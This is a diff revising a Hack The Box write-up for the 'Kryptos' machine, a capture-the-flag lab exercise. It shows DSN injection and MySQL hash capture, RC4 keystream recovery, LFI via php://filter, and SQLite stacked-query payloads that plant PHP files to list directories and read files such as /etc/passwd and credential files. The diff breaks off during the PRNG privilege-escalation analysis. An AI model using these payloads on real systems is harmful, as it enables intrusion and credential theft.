@@ -1,27 +1,36 @@
 ---
 layout: single
-title: kryptos - Hack The Box
-excerpt: "TBA"
+title: Kryptos - Hack The Box
+excerpt: "I loved the Kryptos machine from Adamm and no0ne. It starts with a cool parameter injection in the DSN string so I can redirect the DB queries to my VM and have the webserver authenticate to a DB I control. Next is some crypto with the RC4 stream cipher in the file encryptor web app to get access to a protected local web directory and an LFI vulnerability in the PHP code that let me read the source code. After, there's an SQL injection and I use stacked queries with sqlite to gain write access and RCE by writing PHP code. After finding an encrypted vim file, I'll exploit a vulnerability in the blowfish implementation to recover the plaintext and get SSH credentials. For the priv esc, I pop a root shell by evading an eval jail in a SUID python webserver and exploiting a broken PRNG implementation."
 date: 2019-09-21
 classes: wide
 header:
   teaser: /assets/images/htb-writeup-kryptos/kryptos_logo.png
+  teaser_home_page: true
+  icon: /assets/images/hackthebox.webp
 categories:
   - hackthebox
   - infosec
 tags:
   - linux
   - crypto
-  -
+  - sqli
+  - php
+  - vim
+  - lfi
+  - mysql
+  - sqlite
+  - injection
+  - jail escape
 ---
 
 ![](/assets/images/htb-writeup-kryptos/kryptos_logo.png)
 
-TBA
+I loved the Kryptos machine from [Adamm](https://asimuntis.github.io/) and no0ne. It starts with a cool parameter injection in the DSN string so I can redirect the DB queries to my VM and have the webserver authenticate to a DB I control. Next is some crypto with the RC4 stream cipher in the file encryptor web app to get access to a protected local web directory and an LFI vulnerability in the PHP code that let me read the source code. After, there's an SQL injection and I use stacked queries with sqlite to gain write access and RCE by writing PHP code. After finding an encrypted vim file, I'll exploit a vulnerability in the blowfish implementation to recover the plaintext and get SSH credentials. For the priv esc, I pop a root shell by evading an eval jail in a SUID python webserver and exploiting a broken PRNG implementation.
 
 ### Nmap
 
-This is a web box, only Apache is listening on port 80.
+Not much to see here, standard Linux box with SSH and Apache.
 
 ```
 # nmap -sC -sV -p- kryptos.htb
@@ -55,11 +64,11 @@ I tried guessing a few credentials and always got a `Nope.` message:
 
 ![](/assets/images/htb-writeup-kryptos/nope.png)
 
-The POST request also contains the `db` value set in a hidden form field and a CSRF `token`:
+I see that the POST request passes the username and passwords as well as a CSRF token and a `db` value.
 
 ![](/assets/images/htb-writeup-kryptos/post.png)
 
-I ran gobuster and found a couple of interesting files but I get a redirect to the login page everytime so I need to bypass the login page first.
+I ran gobuster and found a couple of interesting directories and files but I get a redirect to the login page everytime because I'm not logged in so I'll need to bypass the login page first. That `/dev` folder gives me a 403 error so it's probably only accessible locally or something.
 ```
 # gobuster -q -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php -t 50 -u http://kryptos.htb
 /.htpasswd (Status: 403)
@@ -79,7 +88,7 @@ I ran gobuster and found a couple of interesting files but I get a redirect to t
 /url.php (Status: 200)
 ```
 
-Because this box is ranked `insane` difficulty, this is most likely not a login page that we can bypass with a simple SQL injection. After playing with some of the parameters with Burp I found that whenever I change the `db` parameter I get the following error message:
+Because this box is ranked `insane` difficulty, this is most likely not a login page that I can bypass with a simple SQL injection. After playing with some of the parameters with Burp I found that whenever I change the `db` parameter I get the following error message:
 
 ```
 Connection: close
@@ -113,7 +122,7 @@ while True:
 Sample output:
 
 ```
-root@ragingunicorn:~/htb/kryptos# python db.py
+# python db.py
 > invalid
 {'username': 'user', 'token': u'9c73104a5a7aa15ffea40720928c9dc481fd85d2b42c5b102e123c2b2de1c7d6', 'password': 'pass', 'db': 'invalid', 'login': ''}
 PDOException code: 1044
@@ -136,7 +145,7 @@ To verify this I started a netcat listener on my Kali VM on port 3306 and inject
 
 ![](/assets/images/htb-writeup-kryptos/mysql_callback.png)
 
-The MySQL server connects back to me so that means I can retrieve the hash using the MSF `server/capture/mysql` module.
+The MySQL server connects back to me so that means I can capture the challenge and response pairs and then crack them offline. Metasploit already has a module for that: `server/capture/mysql`
 
 ```
 msf5 auxiliary(server/capture/mysql) > show options
@@ -161,14 +170,14 @@ msf5 auxiliary(server/capture/mysql) >
 The hash was saved to the following file:
 
 ```
-root@ragingunicorn:~/htb/kryptos# cat mysqlpwd_mysqlna
+# cat mysqlpwd_mysqlna
 dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
 ```
 
-I was able to crack the hash with `hashcat`:
+I'm able to crack the hash with hashcat: `krypt0n1te`
 
 ```
-root@ragingunicorn:~/htb/kryptos# john -w=/usr/share/wordlists/rockyou.txt mysqlpwd_mysqlna
+# john -w=/usr/share/wordlists/rockyou.txt mysqlpwd_mysqlna
 Using default input encoding: UTF-8
 Loaded 1 password hash (mysqlna, MySQL Network Authentication [SHA1 32/64])
 Will run 4 OpenMP threads
@@ -176,12 +185,12 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 krypt0n1te       (dbuser)
 ```
 
-I tried those credentials on the login page but they didn't work. But since I now control which database backend is used for authentication, I can create a database on my own machine with a username/password that I control.
+I tried those credentials on the login page but as expected they don't work because they're the DB creds, not the actual user credentials in the database. Since I now control which database backend is used for authentication and I have the credentials, I can create a database on my own machine with a username/password that I control. This will allow me to pass the authentication and login in to the site.
 
 First, I need to change the MySQL server configuration so the servers listens on all interface and not just localhost:
 
 ```
-root@ragingunicorn:~/htb/kryptos# cat /etc/mysql/mariadb.conf.d/50-server.cnf
+# cat /etc/mysql/mariadb.conf.d/50-server.cnf
 
 # this is read by the standalone daemon and embedded servers
 [server]
@@ -218,15 +227,15 @@ I set up the Match and Replace function in Burp so I don't need to fiddle with t
 
 ![](/assets/images/htb-writeup-kryptos/burp_replace.png)
 
-I still got a `Nope.` message when logging in but I noticed in the MySQL logs that the SQL query is using an MD5 value and not the plaintext value of the password I configured.
+I still got a `Nope.` message when logging in but I noticed in the MySQL logs that the SQL query is using the MD5 value of the password instead of the plaintext password.
 
 ```
 root@ragingunicorn:/var/log/mysql# tail -f *
 
-33 Query	SELECT username, password FROM users WHERE username='snowscan' AND password='5ba4e0731a6248ea222262e4a65a912b'
+33 Query SELECT username, password FROM users WHERE username='snowscan' AND password='5ba4e0731a6248ea222262e4a65a912b'
 ```
 
-So I just modified the existing password entry with this value:
+So I just modified the existing password entry with the MD5 value of `yolo1234`:
 
 ```
 MariaDB [cryptor]> update users set password='5ba4e0731a6248ea222262e4a65a912b' where username='snowscan';
@@ -240,14 +249,14 @@ And now I can log in successfully:
 
 ### Web - 2nd part (crypto)
 
-The page encrypts the file we upload with either `AES-CBC` or `RC4`. We don't get to pick the key so I assume this is hardcoded in the code which we don't have access right now. I tried fuzzing the handler to use `file:///` or something like that and also tried to pick another cipher like `None` or `Null` but that didn't work.
+The web app encrypts files that are linked on the form with either `AES-CBC` or `RC4`. I don't get to pick the key so I assume this is hardcoded in the code which I don't have access to right now. I tried fuzzing the handler to use `file:///` or something like that and also tried to pick another cipher like `None` or `Null` but that didn't work.
 
 I don't see any obvious way to exploit `AES-CBC` here but `RC4` is interesting because the key stream generated here is the same across all files we encrypt. To verify this I created three different files on my machine:
 
 ```
-root@ragingunicorn:~/htb/kryptos# echo AAAAAAAA > 1
-root@ragingunicorn:~/htb/kryptos# echo AAAAAAAAAAAAAAAA > 2
-root@ragingunicorn:~/htb/kryptos# echo AAAAAAAAAAAAAAAAAAAAAAAA > 3
+# echo AAAAAAAA > 1
+# echo AAAAAAAAAAAAAAAA > 2
+# echo AAAAAAAAAAAAAAAAAAAAAAAA > 3
 ```
 
 When I encrypt the files, I can clearly see that the same key stream is used across all 3 files since the beginning of the ciphertext is the same:
@@ -266,11 +275,13 @@ GX+u3Xsraj8L2vu3pnC2hfU=
 GX+u3Xsraj8L2vu3pnC2hb52BXbRJNo4Vw==
 ```
 
-The ciphertext is common across all three plaintexts so the encryption here is using a static key for generate the RC4 key stream. We can't recover the key used to initialize RC4 but we can recover the XOR key stream since we control the plaintext and we also have the ciphertext. I just need to generate a large file, encrypt it with the web application and xor the ciphertext with the original plaintext to recover the key stream. Then I can use the key stream to decrypt the ciphertext of other files.
+The ciphertext is common across all three plaintexts so the encryption here is using a static key for generate the RC4 key stream. I can't recover the key used to initialize RC4 but I can recover the XOR key stream since I control the plaintext and I also have the ciphertext. I just need to generate a large file, encrypt it with the web application and XOR the ciphertext with the original plaintext to recover the key stream. Then I can use the key stream to decrypt the ciphertext of other files.
 
-root@ragingunicorn:~/htb/kryptos# python -c 'print "A" * 1000000' > plaintext
+```
+# python -c 'print "A" * 1000000' > plaintext
+```
 
-![](/assets/images/htb-writeup-kryptos/rc4_4.png)
+![](/assets/images/htb-writeup-kryptos/rc_4.png)
 
 I saved the output to `ciphertext` on my machine, then used a script to XOR both plaintext and ciphertext and generate a key stream file.
 
@@ -280,11 +291,6 @@ I saved the output to `ciphertext` on my machine, then used a script to XOR both
 import base64
 
 def sxor(s1,s2):
-    # convert strings to a list of character pair tuples
-    # go through each tuple, converting them to ASCII code (ord)
-    # perform exclusive or on the ASCII code
-    # then convert the result back to ASCII (chr)
-    # merge the resulting array of characters as a string
     return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))
 
 with open('plaintext', 'rb') as f:
@@ -314,11 +320,6 @@ import sys
 headers = { "Cookie": "PHPSESSID=pek49sa9sh4ntpca7cp1f5nffi"}
 
 def sxor(s1,s2):
-    # convert strings to a list of character pair tuples
-    # go through each tuple, converting them to ASCII code (ord)
-    # perform exclusive or on the ASCII code
-    # then convert the result back to ASCII (chr)
-    # merge the resulting array of characters as a string
     return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))
 
 if len(sys.argv) != 2:
@@ -339,10 +340,10 @@ else:
     print "** Nothing returned **"
 ```
 
-With the script I was to query that `/dev/` directory I had found earlier but that gave me a 403 forbidden message. Since I'm not issuing request "locally" through the encrypt page, I can access the `/dev/` directory:
+The next step of the operation here is to exploit the file encryptor to read local files. By using the file encryptor I'm able to query that `/dev/` directory which I had found earlier but that gave me a 403 forbidden message.
 
 ```
-root@ragingunicorn:~/htb/kryptos# python decrypthttp.py http://127.0.0.1/dev/
+# python decrypthttp.py http://127.0.0.1/dev/
 <html>
     <head>
     </head>
@@ -359,8 +360,8 @@ root@ragingunicorn:~/htb/kryptos# python decrypthttp.py http://127.0.0.1/dev/
 Fetching the two pages shown above:
 
 ```
-root@ragingunicorn:~/htb/kryptos# python decrypthttp.py http://127.0.0.1/dev/index.php?view=about
-^[[A<html>
+# python decrypthttp.py http://127.0.0.1/dev/index.php?view=about
+    <html>
     <head>
     </head>
     <body>
@@ -373,7 +374,7 @@ This is about page
 </body>
 </html>
 
-root@ragingunicorn:~/htb/kryptos# python decrypthttp.py http://127.0.0.1/dev/index.php?view=todo
+# python decrypthttp.py http://127.0.0.1/dev/index.php?view=todo
 <html>
     <head>
     </head>
@@ -395,10 +396,10 @@ root@ragingunicorn:~/htb/kryptos# python decrypthttp.py http://127.0.0.1/dev/ind
 </html>
 ```
 
-So it's obvious the next target is `sqlite_test_page.php` but the page doesn't seem to return much:
+The next target seems to be `sqlite_test_page.php` but the page doesn't seem to return much:
 
 ```
-root@ragingunicorn:~/htb/kryptos# python decrypthttp.py http://127.0.0.1/dev/sqlite_test_page.php
+# python decrypthttp.py http://127.0.0.1/dev/sqlite_test_page.php
 <html>
 <head></head>
 <body>
@@ -406,17 +407,17 @@ root@ragingunicorn:~/htb/kryptos# python decrypthttp.py http://127.0.0.1/dev/sql
 </html>
 ```
 
-It's probably expecting some parameter either in a GET or POST request but we don't know what the parameter name is. The `index.php` page uses the `view` parameter to display the other page, we can confirm this below by browsing to `about.php` directly.
+It's probably expecting some parameter either in a GET or POST request but I don't know what the parameter name is. The `index.php` page uses the `view` parameter to display the other pages by including the parameter name concatenated with the `.php` extension. I can confirm this below by browsing to `about.php` directly.
 
 ```
-root@ragingunicorn:~/htb/kryptos# python decrypthttp.py http://127.0.0.1/dev/about.php
+# python decrypthttp.py http://127.0.0.1/dev/about.php
 This is about page
 ```
 
-This `view` parameter is probably a good target for an LFI but at first glance I wasn't able to get anywhere when I tried the obvious suspects like `../../../etc/passwd` but I wasn't able to view the file since `.php` is probably appended to the parameter:
+This `view` parameter is probably a good target for an LFI but at first glance I wasn't able to get anywhere when I tried the obvious suspects like `../../../etc/passwd` because `.php` is appended to the parameter:
 
 ```
-root@ragingunicorn:~/htb/kryptos# python decrypthttp.py http://127.0.0.1/dev/index.php?view=../../../../etc/passwd
+# python decrypthttp.py http://127.0.0.1/dev/index.php?view=../../../../etc/passwd
 <html>
     <head>
     </head>
@@ -430,10 +431,10 @@ root@ragingunicorn:~/htb/kryptos# python decrypthttp.py http://127.0.0.1/dev/ind
 </html>
 ```
 
-I used the PHP filter trick to read the `sqlite_test_page.php`
+So I used the PHP filter trick to read the `sqlite_test_page.php`. I'm using the base64 filter to encode and return the content of the file being included.
 
 ```
-root@ragingunicorn:~/htb/kryptos# python decrypthttp.py "http://127.0.0.1/dev/index.php?view=php://filter/convert.base64-encode/resource=sqlite_test_page"
+# python decrypthttp.py "http://127.0.0.1/dev/index.php?view=php://filter/convert.base64-encode/resource=sqlite_test_page"
 <html>
     <head>
     </head>
@@ -499,15 +500,15 @@ else
 </html>
 ```
 
-Based on the code above we now know:
+Based on the code above I see that:
 - The `d9e28afcf0b274a5e0542abb67db0784` directory is world writable
 - The GET parameters for this code are `no_results` and `bookid`
 - The SQL query is clearly injectable as there is no sanitization done
 
-I downloaded the entire .db file using the PHP filter LFI and it only contains a single tables with two rows so there is nothing of value to extract using an SQL injection.
+I downloaded the entire .db file using the PHP filter LFI and it only contains a single table with two rows so there is nothing of value to extract using an SQL injection.
 
 ```
-root@ragingunicorn:~/htb/kryptos# sqlite3 books.db
+# sqlite3 books.db
 SQLite version 3.27.2 2019-02-25 16:06:06
 Enter ".help" for usage hints.
 sqlite> .tables
@@ -516,7 +517,7 @@ sqlite> select * from books;
 1|Serious Cryptography
 2|Applied Cryptography
 
-root@ragingunicorn:~/htb/kryptos# python decrypthttp.py http://127.0.0.1/dev/sqlite_test_page.php?bookid=1
+# python decrypthttp.py http://127.0.0.1/dev/sqlite_test_page.php?bookid=1
 <html>
 <head></head>
 <body>
@@ -527,10 +528,10 @@ Name = Serious Cryptography
 </html>
 ```
 
-The injection `1 or 2` failed when I tried it:
+I tried a simple injection with `1 or 2` but it failed when I tried it:
 
 ```
-root@ragingunicorn:~/htb/kryptos# python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?bookid=1 or 2"
+# python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?bookid=1 or 2"
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
 <title>400 Bad Request</title>
@@ -543,7 +544,7 @@ root@ragingunicorn:~/htb/kryptos# python decrypthttp.py "http://127.0.0.1/dev/sq
 </body></html>
 ```
 
-This is because we need to URL encode the value of the `bookid` parameter otherwise the query becomes invalid.
+This is because I need to URL encode the value of the `bookid` parameter otherwise the query becomes invalid.
 
 I modified the script to support a 2nd argument that contains extra data that needs to be URL encoded twice:
 
@@ -562,11 +563,6 @@ headers = { "Cookie": "PHPSESSID=pek49sa9sh4ntpca7cp1f5nffi"}
 proxies = { "http": "http://127.0.0.1:8080" }
 
 def sxor(s1,s2):
-    # convert strings to a list of character pair tuples
-    # go through each tuple, converting them to ASCII code (ord)
-    # perform exclusive or on the ASCII code
-    # then convert the result back to ASCII (chr)
-    # merge the resulting array of characters as a string
     return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))
 
 payload = urllib.quote_plus(sys.argv[1])
@@ -592,10 +588,10 @@ else:
     print "** Nothing returned **"
 ```
 
-Testing the injection again, I can see it works now since I get `bookid` 1 and 2:
+Testing the injection again, I can see that it works now since I get both book entries:
 
 ```
-root@ragingunicorn:~/htb/kryptos# python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?bookid=" "1 or 2"
+# python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?bookid=" "1 or 2"
 <html>
 <head></head>
 <body>
@@ -607,12 +603,12 @@ Name = Applied Cryptography
 </html>
 ```
 
-Sqlite supports stacked queries so that allows us to write arbitrary files. We can create a new database in the `d9e28afcf0b274a5e0542abb67db0784` directory and write data into a table. Then by issuing a GET to that file the PHP code should be reached and executed.
+Sqlite supports stacked queries so that allows me to write arbitrary files. I can create a new database in the `d9e28afcf0b274a5e0542abb67db0784` directory and write PHP data into a table. Then by issuing a GET to that file the PHP code should be reached and executed.
 
 First, I tested writing a simple text file with no PHP code.
 
 ```
-root@ragingunicorn:~/htb/kryptos# python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&bookid=1" ";ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/test.txt' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('Testing...');"
+# python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&bookid=1" ";ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/test.txt' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('Testing...');"
 <html>
 <head></head>
 <body>
@@ -621,15 +617,15 @@ Query : SELECT * FROM books WHERE id=1;ATTACH DATABASE 'd9e28afcf0b274a5e0542abb
 </body>
 </html>
 
-root@ragingunicorn:~/htb/kryptos# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/test.txt"
+# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/test.txt"
 ��.EtablepwnpwnCREATE TABLE pwn (yolo text)
   !Testing...
 ```
 
-I confirmed that we can now write files to the target directory. Then I wrote a `phpinfo.php` to check the PHP configuration:
+So this confirms that I can now write files to the target directory. Then I wrote a `phpinfo.php` to check the PHP configuration:
 
 ```
-root@ragingunicorn:~/htb/kryptos# python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&bookid=1" ";ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/phpinfo.php' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('<?php phpinfo(); ?>');"
+# python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&bookid=1" ";ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/phpinfo.php' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('<?php phpinfo(); ?>');"
 <html>
 <head></head>
 <body>
@@ -640,7 +636,7 @@ Query : SELECT * FROM books WHERE id=1;ATTACH DATABASE 'd9e28afcf0b274a5e0542abb
 ```
 
 ```
-root@ragingunicorn:~/htb/kryptos# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/phpinfo.php"
+# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/phpinfo.php"
 [...]
 <tr><td class="e">System </td><td class="v">Linux kryptos 4.15.0-46-generic #49-Ubuntu SMP Wed Feb 6 09:
 33:07 UTC 2019 x86_64 </td></tr>
@@ -657,18 +653,18 @@ et_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedw
 priority,pcntl_setpriority,pcntl_async_signals,</td></tr>
 ```
 
-I can't easily get a PHP shell since most of the dangerous functions are disabled. But we can read directories and files.
+I can't easily get a PHP shell since most of the "dangerous" functions are disabled. But I can read directories and files.
 
 To scan directories:
 
 ```
-root@ragingunicorn:~/htb/kryptos# python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&bookid=1" ";ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/dir.php' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('<?php var_dump(scandir(\$_GET[\"x\"])); ?>');"
+# python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&bookid=1" ";ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/dir.php' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('<?php var_dump(scandir(\$_GET[\"x\"])); ?>');"
 ```
 
 I found the user directory and interesting files in it:
 
 ```
-root@ragingunicorn:~/htb/kryptos# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/dir.php?x=/home/"
+# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/dir.php?x=/home/"
 ��)[array(3) {nCREATE TABLE pwn (yolo text)
   [0]=>
   string(1) "."
@@ -678,7 +674,7 @@ root@ragingunicorn:~/htb/kryptos# python decrypthttp.py "http://127.0.0.1/dev/d9
   string(8) "rijndael"
 }
 
-root@ragingunicorn:~/htb/kryptos# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/dir.php?x=/home/rijndael"
+# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/dir.php?x=/home/rijndael"
 ��)[array(13) {CREATE TABLE pwn (yolo text)
   [0]=>
   string(1) "."
@@ -712,11 +708,11 @@ root@ragingunicorn:~/htb/kryptos# python decrypthttp.py "http://127.0.0.1/dev/d9
 To read the files:
 
 ```
-root@ragingunicorn:~/htb/kryptos# python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&bookid=1" ";ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/file.php' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('<?php readfile(\$_GET[\"x\"]); ?>');"
+# python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&bookid=1" ";ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/file.php' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('<?php readfile(\$_GET[\"x\"]); ?>');"
 ```
 
 ```
-root@ragingunicorn:~/htb/kryptos# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/file.php?x=/etc/passwd"
+# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/file.php?x=/etc/passwd"
 �� Iroot:x:0:0:root:/root:/bin/bashlo text)
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -745,38 +741,38 @@ sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
 rijndael:x:1001:1001:,,,:/home/rijndael:/bin/bash
 mysql:x:107:113:MySQL Server,,,:/nonexistent:/bin/false
 
-root@ragingunicorn:~/htb/kryptos# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/file.php?x=/home/rijndael/user.txt"
+# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/file.php?x=/home/rijndael/user.txt"
 �� ItablepwnpwnCREATE TABLE pwn (yolo text)
 
-root@ragingunicorn:~/htb/kryptos# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/file.php?x=/home/rijndael/creds.txt"
+# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/file.php?x=/home/rijndael/creds.txt"
 �� IVimCrypt~02!REATE TABLE pwn (yolo text)
 �vnd]�K�yYC}�5�6gMRA�nD�@p;�-�
 
-root@ragingunicorn:~/htb/kryptos# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/file.php?x=/home/rijndael/creds.old"
+# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/file.php?x=/home/rijndael/creds.old"
 �� Irijndael / Password1BLE pwn (yolo text)
 ```
 
 Ok, so I can't read the `user.txt` file, I'll probably need to get a shell first.
 
-The creds file are interesting though but the binary output from the PHP script makes it hard to determine what is the content of the file being read versus the binary from the sqlite database. I'll just modify the script so it outputs the base64 content of file being read instead.
+The creds files are interesting but the binary output from the PHP script makes it hard to determine what is the content of the file being read versus the binary from the sqlite database. I'll just modify the script so it outputs the base64 content of file being read instead.
 
 ```
-root@ragingunicorn:~/htb/kryptos# python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&bookid=1" ";ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/test30.php' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('<?php echo(\"---\" . base64_encode(file_get_contents(\$_GET[\"x\"])) . \"---\"); ?>');"
+# python decrypthttp.py "http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&bookid=1" ";ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/test30.php' AS snow; CREATE TABLE snow.pwn (yolo text); INSERT INTO snow.pwn (yolo) VALUES ('<?php echo(\"---\" . base64_encode(file_get_contents(\$_GET[\"x\"])) . \"---\"); ?>');"
 ```
 
 ```
-root@ragingunicorn:~/htb/kryptos# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/test30.php?x=/home/rijndael/creds.old"
+# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/test30.php?x=/home/rijndael/creds.old"
 ��O�%---cmlqbmRhZWwgLyBQYXNzd29yZDEK---ext)
 
-root@ragingunicorn:~/htb/kryptos# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/test30.php?x=/home/rijndael/creds.txt"
+# python decrypthttp.py "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/test30.php?x=/home/rijndael/creds.txt"
 ��O�%---VmltQ3J5cHR+MDIhCxjkNctWEpo1RIBAcDuWLZMNqBB2bmRdwUviHHlZQ33ZNfs2Z01SQYtu---
 
-root@ragingunicorn:~/htb/kryptos# echo -ne "cmlqbmRhZWwgLyBQYXNzd29yZDEK" | base64 -d > creds.old
-root@ragingunicorn:~/htb/kryptos# echo -ne "VmltQ3J5cHR+MDIhCxjkNctWEpo1RIBAcDuWLZMNqBB2bmRdwUviHHlZQ33ZNfs2Z01SQYtu" | base64 -d > creds.txt
+# echo -ne "cmlqbmRhZWwgLyBQYXNzd29yZDEK" | base64 -d > creds.old
+# echo -ne "VmltQ3J5cHR+MDIhCxjkNctWEpo1RIBAcDuWLZMNqBB2bmRdwUviHHlZQ33ZNfs2Z01SQYtu" | base64 -d > creds.txt
 
-root@ragingunicorn:~/htb/kryptos# cat creds.old
+# cat creds.old
 rijndael / Password1
-root@ragingunicorn:~/htb/kryptos# cat creds.txt
+# cat creds.txt
 VimCrypt~02!
 �vnd]�K�yYC}�5�6gMRA�n
 ```
@@ -784,7 +780,7 @@ VimCrypt~02!
 The `creds.txt` file contains binary, running `file` on it I can see it's a Vim encrypted file:
 
 ```
-root@ragingunicorn:~/htb/kryptos# file creds.txt
+# file creds.txt
 creds.txt: Vim encrypted file data
 ```
 
@@ -801,9 +797,9 @@ If we look at the encrypted file, we see that the ciphertext is :
 d935 fb36 674d 5241 8b6e
 ```
 
-We can guess that the first part of both files is the same -> `rijndael` (known plaintext)
+I can guess that the first part of both files is the same -> `rijndael` (known plaintext)
 
-By XORing the first 8 bytes of both files we can recover the key stream then the plaintext:
+By XORing the first 8 bytes of both files I can recover the key stream then the plaintext:
 
 ![](/assets/images/htb-writeup-kryptos/xor1.png)
 
@@ -811,10 +807,10 @@ By XORing the first 8 bytes of both files we can recover the key stream then the
 
 The password for `rijndael` is `bkVBL8Q9HuBSpj`
 
-We can log in and get the first flag:
+I can log in and get the first flag:
 
 ```
-root@ragingunicorn:~/htb/kryptos# ssh rijndael@kryptos.htb
+# ssh rijndael@kryptos.htb
 rijndael@kryptos.htb's password:
 Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)
 
@@ -931,9 +927,11 @@ def debug():
 run(host='127.0.0.1', port=81, reloader=True)
 ```
 
-The first thing that jumps out is the `eval()` expression. It's been somewhat "hardened" since the builtins are disabled, but there's a way to bypass that. But first, we need to generate a valid signature for the expression to be evaluated.
+The first thing that jumps out is the `eval()` expression. It's been somewhat "hardened" since the builtins are disabled, but there's a way to bypass that. But first, I need to generate a valid signature for the expression to be evaluated.
 
-The second thing is the PRNG function `secure_rng` seems suspicious. I'm no crypto or math expert but if we run the function multiple times we see the same values generated quite often which indicats a broken PRNG.
+The second thing is the PRNG function `secure_rng` seems suspicious. I'm no crypto or math expert but when I run the function multiple times I see the same values generated quite often which indicates a broken PRNG.
+
+I took the function and put it in a new script to test the entropy of the values generated.
 
 ```python
 import random
@@ -959,7 +957,7 @@ for i in range(0,100):
 ```
 
 ```
-root@ragingunicorn:~/htb/kryptos# python testrng.py
+# python testrng.py
 100
 59763658961195455702488250327064726633945798537104807246171656262148713381967
 5
@@ -994,7 +992,7 @@ root@ragingunicorn:~/htb/kryptos# python testrng.py
 3735228685074715981405515645441545414621612408569050452885728516384378329292
 ```
 
-We can test how many tries it takes on average to get a specific value (2 for example):
+Some numbers repeat multiple times which is very unusual. I can test how many tries it takes on average to get a specific value (2 for example):
 
 ```python
 import random
@@ -1027,18 +1025,18 @@ print("It took on average %d times to get the same value twice" % (tries / 100))
 ```
 
 ```
-root@ragingunicorn:~/htb/kryptos# python testrng.py
+# python testrng.py
 It took on average 23 times to get the same value twice
 ```
 
-This confirms that the PRNG is totally broken. So in theory we should able to submit any eval request and it'll work after a few attempts if we're lucky. To test, I'll do a local port forward with SSH first:
+This confirms that the PRNG is totally broken. So in theory I should able to submit any eval request and it'll work after a few attempts. To test, I'll do a local port forward with SSH first:
 
 ```
